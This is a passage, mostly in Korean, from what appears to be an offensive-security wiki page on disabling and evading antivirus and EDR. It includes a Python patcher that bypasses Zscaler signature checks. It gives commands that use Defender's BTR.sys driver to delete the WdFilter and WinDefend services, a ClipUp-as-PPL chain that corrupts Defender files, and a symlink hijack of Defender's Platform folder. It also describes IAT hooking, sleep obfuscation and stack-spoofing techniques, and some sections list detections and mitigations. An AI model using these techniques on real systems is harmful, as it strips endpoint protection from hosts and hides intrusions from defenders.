| `ZSAService.exe` | `WinVerifyTrust` 간접 호출 | NOP 처리 ⇒ 어떤 프로세스든 (서명되지 않은 프로세스도) RPC 파이프에 연결 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`으로 대체 |
| `ZSATunnel.exe` | 터널 무결성 검사 | 우회 |

최소 패처 예시:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

After replacing the original files and restarting the service stack:

* **모든** posture checks가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 명명된 파이프 RPC 엔드포인트(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있습니다.
* 침해된 호스트가 Zscaler 정책에 정의된 내부 네트워크에 제한 없이 액세스할 수 있습니다.

이 사례 연구는 클라이언트 측의 신뢰 결정과 단순한 서명 검사만으로도 몇 바이트를 패치해 무력화할 수 있음을 보여 줍니다.

## Microsoft Defender `BTR.sys` 신뢰 기능 악용

Defender의 **Boot-Time Removal** driver는 기존 BYOVD에 대한 유용한 반례입니다. `BTR.sys`는 메모리 손상 버그와 IOCTL 인터페이스가 없는, Microsoft가 서명한 합법적인 복구 구성 요소입니다. 관리자 액세스 권한과 `SeLoadDriverPrivilege`를 얻은 후, operator는 대신 비공개 복구 트랜잭션을 위조해 의도된 Ring-0 파일/레지스트리 작업을 수행할 수 있습니다. 이는 **침해 후 AV/EDR 무력화 프리미티브이며, 초기 액세스나 권한 상승이 아닙니다**. 또한 눈에 띄는 타사 driver를 가져오는 대신 대상의 자체 `MpEngine.dll`에 있는 `BOOTTIMETOOL` 리소스에서 driver를 추출할 수 있습니다.<sup>[[36]](#references)</sup>

### 원샷 driver 준비

Defender는 일반적으로 리소스를 임의의 `[a-z]{8}.sys` 파일로 저장하고, 비슷한 이름의 커널 서비스를 등록합니다. `DriverEntry`는 서비스의 `Args` 값을 읽고, 지정된 NTFS ADS를 열어 작업 목록을 복호화하고 검증한 다음, 피드백을 기록합니다. 성공적으로 실행되면 driver가 상주하지 않고 언로드되도록 `0xC0000056`(`STATUS_DELETE_PENDING`)을 반환합니다. 위조된 서비스에는 다음과 같은 값이 사용됩니다.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` 스트림에는 RC4로 암호화된 blob 하나가 들어 있습니다. 분석된 빌드에서는 고정된 256바이트 키를 재사용하므로, 암호화는 권한 경계가 아닙니다. 유효한 평문은 24바이트 전역 헤더(`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, 헤더 CRC 및 페이로드에서 파생된 트랜잭션 ID)로 시작하며, 그 뒤에 NUL로 끝나는 UTF-16 피드백 경로와 임의 개수의 항목이 이어집니다. 각 항목은 16바이트 헤더(`DataSize`, `Action`, `HeaderCRC`, `DataCRC`)와 동작별 데이터로 구성되며, 데이터는 **정확히 4개의 NUL 바이트**로 끝납니다. 각 헤더/데이터 영역은 CRC-32 다항식 `0xEDB88320`, 초기 상태 `0xFFFFFFFF`, **최종 XOR 없음**(`~CRC32`)을 사용해 개별적으로 검사되며, 각 영역마다 CRC 상태가 초기화됩니다.<sup>[[36]](#references)[[37]](#references)</sup>

허용되는 동작 ID는 다음 커널 프리미티브를 제공합니다.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | 항목 데이터 | 결과 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | 잠긴 파일을 포함해 파일 삭제 |
| 2 | `[UTF-16 path]` | 비어 있는 디렉터리 제거 |
| 3 | `[Flags][source][destination]` | 공격자가 선택한 보호 경로로 파일 이동; destination이 비어 있으면 삭제 |
| 4 | `[Flags][key path]` | 레지스트리 키 재귀 삭제 |
| 5 | `[Flags][key path + "\\" + value]` | 레지스트리 값 삭제 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | 레지스트리 값을 생성/업데이트하고 누락된 키 경로 생성 |

동작 5와 6에서는 와이어상의 키/값 구분자로 **연속된 백슬래시 두 개**를 사용하므로, 일반적인 형식의 경로는 올바르게 분리되지 않습니다. 피드백 파일은 대부분 요청을 그대로 반영하지만, 각 항목의 첫 4개 데이터 바이트는 결과 `NTSTATUS`가 됩니다. 선행 flags 필드가 없는 동작 1과 2의 경우, BTR은 해당 상태를 저장할 공간을 만들기 위해 경로를 4개의 예약된 후행 바이트로 이동합니다.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow 및 초기 부팅 구간

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)는 전체 체인을 구현합니다. 로컬 Defender에서 `BTR.sys`를 추출하고, `<random>.sys:changelist`와 피드백 스트림을 생성한 뒤, 연결된 동작을 직렬화/체크섬 처리/암호화하고, 서비스 레지스트리 키를 직접 생성합니다. 그런 다음 `-trigger now`에서는 `NtLoadDriver`를 호출하고, `-trigger boot`에서는 시스템 시작 드라이버로 남겨 둡니다. 레지스트리를 직접 스테이징하면 일반 SCM `CreateServiceW` 경로를 거치지 않으므로 서비스 설치 이벤트 ID 7045가 발생하지 **않습니다**. 부팅 시 트리거된 아티팩트는 나중에 `BTR_CLI.exe -cleanup <service_name>`으로 제거할 수 있습니다.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0`은 사용할 수 없습니다. BTR이 storage stack과 `SystemRoot` 링크가 준비되기 전에 `DriverEntry`에서 파일 I/O를 수행하기 때문입니다. 대신 우선순위가 높은 `Boot Bus Extender` 그룹과 함께 `Start=1`을 사용하면 Phase 1에서 실행됩니다. 이때 NTFS는 사용할 수 있지만, 많은 system-start security driver와 user-mode EDR service는 아직 초기화되지 않았습니다. `WdFilter`와 같은 boot-start filter가 이미 로드되었을 수 있지만, BTR은 다음 시작 전에 해당 바이너리나 서비스 구성을 제거할 수 있으며 SCM이 서비스 실행 파일을 시작하기 전에 삭제할 수도 있습니다. BTR은 boot-start 평가가 끝난 뒤 실행되고 유효한 Microsoft 서명을 보유하므로 ELAM으로도 이 공백을 막을 수 없습니다.<sup>[[36]](#references)</sup>

여러 작업이 하나의 트랜잭션에서 실행됩니다. PoC는 하드코딩된 `\SystemRoot\Temp\BootClean.log`를 처리하는 Action 1을 앞에 추가합니다. BTR은 이 로그를 만든 다음 자체 삭제 요청을 처리하고 언로드 전에 로그를 제거합니다. 이렇게 하면 증거를 줄일 수 있으며, `<random>.sys:<random>.dat`에 피드백을 기록하면 드라이버와 두 ADS를 함께 제거할 수 있습니다.<sup>[[36]](#references)[[37]](#references)</sup>

### 높은 신호도의 탐지 상관관계

서명만 확인하는 규칙과 Microsoft 취약 드라이버 차단 목록은 BTR의 의도된 기능을 악용하는 행위를 다루지 않습니다. 합법적인 Defender 계보와 임의의 실행기를 구분하면서 다음과 같은 동작 상관관계를 우선적으로 사용하세요.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` 생성은 BTR 스테이징에서 보편적으로 나타납니다. 동일한 `.sys`에 연결된 `.dat` ADS는 특히 의심스럽습니다. 합법적인 Defender는 일반적으로 `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 아래에 피드백을 저장하기 때문입니다.
- **System 7045가 없는 Sysmon 12/13:** `Args=...:changelist`와 `Group=Boot Bus Extender`를 포함하는 `HKLM\SYSTEM\CurrentControlSet\Services\<random>`의 직접 생성과 이에 대응하는 SCM 설치 이벤트의 부재를 연관 지으세요.
- **Sysmon 6 -> 23:** Defender가 아닌 계보에서 알려진 BTR 드라이버가 로드된 뒤, 특히 보안 바이너리가 `System`/PID 4에 의해 삭제되는 경우를 연관 지으세요.
- **Sysmon 11 -> 23:** `System`/PID 4가 `\SystemRoot\Temp\BootClean.log`를 빠르게 생성한 뒤 삭제하는 경우 경고를 발생시키세요.
- `SeLoadDriverPrivilege`의 할당과 활성화를 제한하고 감사하세요. `cmd.exe`, PowerShell 또는 알 수 없는 프로세스가 보안 도구 드라이버를 스테이징하는 경우, Microsoft 서명만으로는 신뢰하기에 충분하지 않습니다.

## LOLBINs를 사용해 Protected Process Light (PPL)를 악용하여 AV/EDR을 변조하기

Protected Process Light (PPL)는 서명자/수준 계층을 적용하여 동등하거나 더 높은 수준으로 보호된 프로세스만 서로를 변조할 수 있게 합니다. 공격 관점에서 PPL이 활성화된 바이너리를 합법적으로 실행하고 인수를 제어할 수 있다면, 로깅과 같은 무해한 기능을 AV/EDR이 사용하는 보호 디렉터리에 쓰기 작업을 수행하는 제한된 PPL 기반 프리미티브로 전환할 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

프로세스를 PPL로 실행하는 데 필요한 조건
- 대상 EXE(및 로드되는 모든 DLL)는 PPL을 지원하는 EKU로 서명되어야 합니다.
- `CreateProcess`를 사용해 다음 플래그를 지정하여 프로세스를 만들어야 합니다: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 바이너리의 서명자와 일치하는 호환 보호 수준을 요청해야 합니다(예: anti-malware 서명자는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 수준을 지정하면 생성에 실패합니다.

PP/PPL 및 LSASS 보호에 대한 더 넓은 개요는 여기에서도 확인할 수 있습니다.

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

실행기 도구
- 오픈 소스 도우미: CreateProcessAsPPL (보호 수준을 선택하고 대상 EXE에 인수를 전달):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 사용 패턴:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN 프리미티브: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 자체적으로 새 프로세스를 생성하며, 호출자가 지정한 경로에 로그 파일을 쓰는 매개변수를 받습니다.
- PPL 프로세스로 실행하면 파일 쓰기가 PPL 권한으로 수행됩니다.
- ClipUp은 공백이 포함된 경로를 파싱할 수 없으므로, 일반적으로 보호되는 위치를 지정할 때는 8.3 short paths를 사용합니다.

8.3 short path 헬퍼
- short name 목록 확인: 각 상위 디렉터리에서 `dir /x` 실행.
- cmd에서 short path 도출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

악용 체인(개요)
1) launcher(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`로 PPL을 지원하는 LOLBIN(ClipUp)을 실행합니다.
2) ClipUp의 로그 경로 인수를 전달해 보호된 AV 디렉터리(예: Defender Platform)에 파일을 생성하도록 합니다. 필요한 경우 8.3 short name을 사용합니다.
3) 대상 바이너리가 실행 중 AV에 의해 일반적으로 열리거나 잠기는 경우(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기를 예약합니다. 이를 위해 더 일찍 안정적으로 실행되는 자동 시작 서비스를 설치합니다. Process Monitor(boot logging)로 부팅 순서를 검증합니다.
4) 재부팅하면 AV가 바이너리를 잠그기 전에 PPL 권한으로 파일 쓰기가 이루어져 대상 파일이 손상되고 시작이 방지됩니다.

실행 예시(안전을 위해 경로를 생략하거나 축약함):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes 및 제약 사항
- ClipUp이 기록하는 내용은 배치 위치 외에는 제어할 수 없습니다. 이 primitive는 정밀한 콘텐츠 삽입보다는 손상에 적합합니다.
- 서비스를 설치/시작하려면 로컬 관리자/SYSTEM 권한과 재부팅 가능한 시간이 필요합니다.
- 타이밍이 중요합니다. 대상 파일이 열려 있지 않아야 하며, 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

탐지
- 부팅 전후로 비정상적인 인수, 특히 표준적이지 않은 실행 프로그램을 부모로 둔 `ClipUp.exe` 프로세스 생성.
- 의심스러운 바이너리를 자동 시작하도록 설정된 새 서비스가 Defender/AV보다 먼저 일관되게 시작되는지 확인합니다. Defender 시작 실패 전에 서비스가 생성/수정되었는지 조사합니다.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링. 보호된 프로세스 플래그를 가진 프로세스가 예기치 않게 파일을 생성/수정하는지 확인합니다.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스와 AV가 아닌 바이너리의 비정상적인 PPL 수준 사용을 확인합니다.

완화
- WDAC/Code Integrity: PPL로 실행될 수 있는 서명된 바이너리와 허용되는 부모를 제한하고, 정당한 맥락 외의 ClipUp 실행을 차단합니다.
- 서비스 관리: 자동 시작 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링합니다.
- Defender 변조 방지와 조기 시작 보호가 활성화되어 있는지 확인하고, 바이너리 손상을 나타내는 시작 오류를 조사합니다.
- 환경과 호환되는 경우 보안 도구가 있는 볼륨에서 8.3 짧은 이름 생성을 비활성화하는 방안을 고려합니다(충분히 테스트하세요).

## Platform Version Folder Symlink Hijack를 통한 Microsoft Defender 변조

Windows Defender는 다음 경로 아래의 하위 폴더를 열거하여 실행할 플랫폼을 선택합니다.
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 사전식 버전 문자열(예: `4.18.25070.5-0`)을 가진 하위 폴더를 선택한 다음, 해당 폴더에서 Defender 서비스 프로세스를 시작합니다(이에 따라 서비스/레지스트리 경로가 업데이트됨). 이 선택 과정은 디렉터리 reparse point(symlink 포함)를 비롯한 디렉터리 항목을 신뢰합니다. 관리자는 이를 이용해 Defender를 공격자가 쓰기 가능한 경로로 리디렉션하여 DLL sideloading 또는 서비스 중단을 일으킬 수 있습니다.<sup>[[21]](#references)[[22]](#references)</sup>

사전 조건
- 로컬 관리자 권한(Platform 폴더에 디렉터리/symlink를 생성하는 데 필요)
- 재부팅하거나 Defender 플랫폼 재선택을 트리거할 수 있는 권한(부팅 시 서비스 재시작)
- 기본 제공 도구만 필요(mklink)

작동 원리
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, 플랫폼 선택 과정에서는 디렉터리 항목을 신뢰하고 대상 경로가 보호되거나 신뢰할 수 있는 경로로 연결되는지 검증하지 않은 채 사전식으로 가장 높은 버전을 선택합니다.

단계별 절차(예시)
1) 현재 플랫폼 폴더의 쓰기 가능한 복사본을 준비합니다. 예: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 안에 자신의 폴더를 가리키는 더 높은 버전의 디렉터리 심볼릭 링크를 생성합니다:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 드롭하거나 교체해 Defender 프로세스에서 코드를 실행합니다. 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 버전 심볼릭 링크를 제거해 다음 시작 시 설정된 경로가 확인되지 않도록 하고 Defender가 시작되지 못하게 합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> 이 기법만으로는 권한 상승이 되지 않으며, 관리자 권한이 필요합니다.

## PIC를 사용한 API/IAT 후킹 + Call-Stack Spoofing (Crystal Kit 스타일)

레드팀은 대상 모듈의 Import Address Table(IAT)을 후킹하고, 선택한 API 호출을 공격자가 제어하는 position-independent code(PIC)로 라우팅하여 런타임 회피를 C2 implant에서 대상 모듈 자체로 옮길 수 있습니다. 이 방식은 많은 kit에서 노출하는 제한된 API 범위(예: CreateProcessA)를 넘어 회피 기법을 일반화하고, 동일한 보호 기능을 BOF와 post-exploitation DLL에도 적용합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level approach
- reflective loader(앞에 추가하거나 companion 방식)를 사용해 PIC blob을 대상 모듈과 함께 스테이징합니다. PIC는 자체적으로 완결되어 있어야 하며 position-independent여야 합니다.
- 호스트 DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하고, 대상 import(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT 항목을 얇은 PIC wrapper를 가리키도록 패치합니다.
- 각 PIC wrapper는 실제 API 주소로 tail-call하기 전에 회피 기법을 실행합니다. 일반적인 회피 기법은 다음과 같습니다.
  - 호출 전후에 memory mask/unmask를 적용합니다(예: beacon 영역 암호화, RWX→RX 변경, 페이지 이름/권한 변경). 호출 후 원래 상태로 복원합니다.
  - Call-stack spoofing: 정상적으로 보이는 스택을 구성한 뒤 대상 API로 전환하여 call-stack 분석 결과가 예상된 프레임으로 확인되도록 합니다.<sup>[[9]](#references)</sup>
- 호환성을 위해 Aggressor script(또는 이에 상응하는 도구)가 Beacon, BOF, post-ex DLL에 대해 후킹할 API를 등록할 수 있는 인터페이스를 export합니다.

Why IAT hooking here
- 후킹된 import를 사용하는 모든 코드에 적용되므로, 도구 코드를 수정하거나 Beacon이 특정 API를 proxy하도록 할 필요가 없습니다.
- post-ex DLL에도 적용됩니다. LoadLibrary*를 후킹하면 모듈 로드(예: System.Management.Automation.dll, clr.dll)를 가로채 해당 모듈의 API 호출에도 동일한 masking/stack evasion을 적용할 수 있습니다.
- CreateProcessA/W를 wrapper로 감싸 call-stack 기반 탐지에 대응하면서 프로세스 생성 post-ex 명령을 안정적으로 사용할 수 있습니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
참고 사항
- relocation/ASLR 이후, import를 처음 사용하기 전에 patch를 적용합니다. TitanLdr/AceLdr 같은 reflective loader는 로드된 모듈의 DllMain에서 hooking을 수행하는 방식을 보여 줍니다.
- wrapper는 작고 PIC-safe하게 유지합니다. patch 전에 저장해 둔 원래 IAT 값 또는 LdrGetProcedureAddress를 통해 실제 API를 확인합니다.
- PIC에는 RW → RX 전환을 사용하고, 페이지를 writable+executable 상태로 두지 않습니다.

Call-stack spoofing stub
- Draugr 스타일 PIC stub은 가짜 호출 체인(정상 모듈 내부의 return address)을 구성한 다음 실제 API로 전환합니다.
- 이 방식은 Beacon/BOF에서 민감한 API로 이어지는 정형적인 stack을 기대하는 탐지를 우회합니다.
- stack cutting/stack stitching 기법과 함께 사용해 API prologue에 도달하기 전에 예상되는 frame 안으로 진입합니다.

운영 환경 통합
- reflective loader를 post-ex DLL 앞에 추가하면 DLL이 로드될 때 PIC와 hook이 자동으로 초기화됩니다.
- Aggressor script를 사용해 대상 API를 등록하면 코드 변경 없이 Beacon과 BOF가 같은 evasion 경로를 투명하게 활용합니다.

탐지/DFIR 고려 사항
- IAT 무결성: image에 속하지 않는(heap/anon) 주소를 가리키는 항목, import pointer의 주기적 검증.
- Stack 이상 징후: 로드된 image에 속하지 않는 return address, non-image PIC로의 급격한 전환, 일관성 없는 RtlUserThreadStart ancestry.
- Loader telemetry: 프로세스 내부의 IAT 쓰기, import thunk를 수정하는 이른 시점의 DllMain 활동, 로드 시 생성되는 예상 밖의 RX 영역.
- Image-load evasion: LoadLibrary*를 hooking하는 경우, 메모리 masking 이벤트와 연관된 automation/clr assembly의 의심스러운 로드를 모니터링합니다.

관련 구성 요소 및 예시
- 로드 중 IAT patching을 수행하는 reflective loader(예: TitanLdr, AceLdr)
- Memory masking hook(예: simplehook) 및 stack-cutting PIC(stackcutting)
- PIC call-stack spoofing stub(예: Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 상주 PICO를 통한 import-time IAT hook

reflective loader를 제어할 수 있다면, 사용자 지정 resolver가 먼저 hook을 확인하도록 loader의 `GetProcAddress` pointer를 바꿔 `ProcessImports()` **중에** import를 hooking할 수 있습니다:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 일시적인 loader PIC가 해제된 뒤에도 유지되는 **resident PICO**(persistent PIC object)를 만듭니다.
- loader의 import resolver를 덮어쓰는 `setup_hooks()` 함수를 export합니다(예: `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress`에서 ordinal import는 건너뛰고 `__resolve_hook(ror13hash(name))` 같은 hash 기반 hook 검색을 사용합니다. hook이 있으면 해당 hook을 반환하고, 없으면 실제 `GetProcAddress`에 위임합니다.
- Crystal Palace의 `addhook "MODULE$Func" "hook"` 항목으로 link 시점에 hook 대상을 등록합니다. hook은 resident PICO 내부에 있으므로 유효하게 유지됩니다.

이 방식은 로드 후 DLL의 code section을 patch하지 않고 **import-time IAT redirection**을 수행합니다.

### 대상이 PEB-walking을 사용하는 경우 hook 가능한 import 강제

import-time hook은 해당 함수가 실제로 대상의 IAT에 있을 때만 작동합니다. 모듈이 PEB-walk와 hash를 통해 API를 확인한다면(import 항목 없음), 실제 import를 강제로 넣어 loader의 `ProcessImports()` 경로에서 해당 import를 처리하게 합니다.

- hash 기반 export 확인(예: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`)을 `&WaitForSingleObject` 같은 직접 참조로 바꿉니다.
- compiler가 IAT 항목을 생성하므로 reflective loader가 import를 확인할 때 interception을 수행할 수 있습니다.

### `Sleep()`을 patch하지 않는 Ekko 스타일 sleep/idle obfuscation

`Sleep`을 patch하는 대신 implant가 실제로 사용하는 **wait/IPC primitive**(`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)를 hooking합니다. 대기 시간이 긴 경우, idle 중 메모리 image를 암호화하는 Ekko 스타일 obfuscation chain으로 호출을 감쌉니다:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`를 사용해 `NtContinue`를 호출하는, 구성된 `CONTEXT` frame의 callback sequence를 예약합니다.
- 일반적인 chain(x64): image를 `PAGE_READWRITE`로 설정 → 전체 mapped image에 `advapi32!SystemFunction032`를 사용해 RC4 암호화 → blocking wait 수행 → RC4 복호화 → PE section을 순회하며 **section별 permission 복원** → 완료 신호 전송.
- `RtlCaptureContext`로 template `CONTEXT`를 얻고, 이를 여러 frame에 복제한 뒤 각 단계 호출에 사용할 register(`Rip/Rcx/Rdx/R8/R9`)를 설정합니다.

운영 시 참고: 대기 시간이 긴 경우(예: `WAIT_OBJECT_0`) “success”를 반환해 image가 masking된 상태에서 caller가 계속 실행되도록 합니다. 이 패턴은 idle 구간에 scanner로부터 모듈을 숨기며, 전형적인 “patched `Sleep()`” signature를 피합니다.

탐지 아이디어(telemetry 기반)
- `NtContinue`를 가리키는 `CreateTimerQueueTimer` callback이 짧은 시간에 다수 발생.
- 크기가 큰 연속 image 크기 buffer에 `advapi32!SystemFunction032` 사용.
- 광범위한 `VirtualProtect` 호출 후 사용자 지정 section별 permission 복원.

### Sleep-obfuscation gadget의 runtime CFG 등록

CFG가 활성화된 대상에서는 `jmp [rbx]` 또는 `jmp rdi` 같은 mid-function gadget으로 처음 indirect jump를 수행할 때, 해당 gadget이 모듈의 CFG metadata에 없으면 대개 `STATUS_STACK_BUFFER_OVERRUN`으로 프로세스가 crash합니다. 강화된 프로세스 내부에서 Ekko/Kraken 스타일 chain을 유지하려면:<sup>[[30]](#references)</sup>

- chain에서 사용하는 모든 indirect destination을 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 및 `CFG_CALL_TARGET_VALID` 항목으로 등록합니다.
- 로드된 image(`ntdll`, `kernel32`, `advapi32`) 내부의 주소는 `MEMORY_RANGE_ENTRY`가 **image base**에서 시작해 **전체 image 크기**를 포함해야 합니다.
- manually mapped/PIC/stomped region에는 **allocation base**와 allocation size를 대신 사용합니다.
- dispatch gadget뿐 아니라 간접적으로 도달하는 export(`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall)와 간접 대상으로 사용될 공격자 제어 executable section도 표시합니다.

이렇게 하면 ROP/JOP 스타일 sleep chain을 “CFG가 비활성화된 프로세스에서만 작동”하는 방식에서 `/guard:cf`로 빌드된 `explorer.exe`, browser, `svchost.exe` 및 기타 endpoint에서도 재사용 가능한 primitive로 바꿀 수 있습니다.

### Sleeping thread를 위한 CET-safe stack spoofing

전체 `CONTEXT`를 교체하는 방식은 흔적이 남기 쉽고, spoof된 `Rip`가 hardware shadow stack과 일치해야 하므로 CET Shadow Stack 시스템에서 문제가 발생할 수 있습니다. 더 안전한 sleep-masking 패턴은 다음과 같습니다:<sup>[[30]](#references)</sup>

- 같은 프로세스의 다른 thread를 선택한 뒤 `NtQueryInformationThread`를 통해 해당 thread의 `NT_TIB` / TEB stack bounds(`StackBase`, `StackLimit`)를 읽습니다.
- 현재 thread의 실제 TEB/TIB를 백업합니다.
- `GetThreadContext`로 실제 sleeping context를 캡처합니다.
- spoof context에는 실제 `Rip`만 복사하고, spoof된 `Rsp`/stack state는 그대로 둡니다.
- sleep 구간 동안 spoof thread의 `NT_TIB`를 현재 TEB에 복사해 stack walker가 정상적인 stack range 내부에서 unwind하도록 합니다.
- 대기가 끝나면 원래 TIB와 thread context를 복원합니다.

이 방식은 CET와 일치하는 instruction pointer를 유지하면서, TEB stack metadata를 신뢰해 unwind를 검증하는 EDR stack walker를 오도합니다.

### 대안: APC 기반 Kraken Mask

timer-queue dispatch의 signature가 너무 뚜렷하다면, 같은 sleep-encrypt-spoof-restore sequence를 queued APC를 사용하는 suspended helper thread에서 실행할 수 있습니다:<sup>[[27]](#references)</sup>

- entrypoint가 `NtTestAlert`인 helper thread를 만듭니다.
- 준비한 `CONTEXT` frame/APC를 `NtQueueApcThread`로 queue하고 `NtAlertResumeThread`로 처리합니다.
- 기본 64 KB thread stack을 고갈시키지 않도록 chain state를 helper stack이 아니라 heap에 저장합니다.
- `NtSignalAndWaitForSingleObject`를 사용해 시작 event를 원자적으로 신호한 뒤 대기합니다.
- TIB/context를 복원하기 전에 main thread를 suspend합니다(`NtSuspendThread` → restore → `NtResumeThread`). 이를 통해 scanner가 반쯤 복원된 stack을 포착할 수 있는 race window를 줄입니다.

이 방식은 `CreateTimerQueueTimer` + `NtContinue` signature를 helper-thread/APC signature로 바꾸면서, 동일한 RC4 masking 및 stack-spoofing 목적을 유지합니다.

추가 탐지 아이디어
- sleep, wait 또는 APC dispatch 직전에 발생하는 `VmCfgCallTargetInformation`이 포함된 `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` 또는 `ConnectNamedPipe` 호출 전후의 `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` 호출 후 현재 thread의 TEB/TIB stack bounds에 직접 쓰기.
- 간접적으로 `SystemFunction032`, `VirtualProtect` 또는 section-permission 복원 helper에 도달하는 `NtQueueApcThread`/`NtAlertResumeThread` chain.
- 서명된 모듈 내부에서 dispatch pivot으로 `FF 23` (`jmp [rbx]`) 또는 `FF E7` (`jmp rdi`) 같은 짧은 gadget signature를 반복 사용.

## Precision Module Stomping

Module stomping은 명백한 private executable memory를 할당하거나 새로운 sacrificial DLL을 로드하는 대신, 대상 프로세스에 이미 매핑된 DLL의 **`.text` section**에서 payload를 실행합니다. 덮어쓰기 대상은 **로드된 disk-backed image**여야 하며, 프로세스에 계속 필요한 code path를 손상시키지 않고 해당 code space에 payload를 수용할 수 있어야 합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 신뢰할 수 있는 대상 선택

`uxtheme.dll` 또는 `comctl32.dll` 같은 일반 모듈을 대상으로 하는 단순한 stomping은 취약합니다. DLL이 원격 프로세스에 로드되지 않았을 수도 있고, code region이 너무 작으면 프로세스가 crash할 수 있습니다. 더 신뢰할 수 있는 workflow는 다음과 같습니다.

1. 대상 프로세스의 모듈을 열거하고, 이미 로드된 DLL의 **이름만 포함하는 목록**을 유지합니다.
2. 먼저 payload를 빌드하고 **정확한 byte 크기**를 기록합니다.
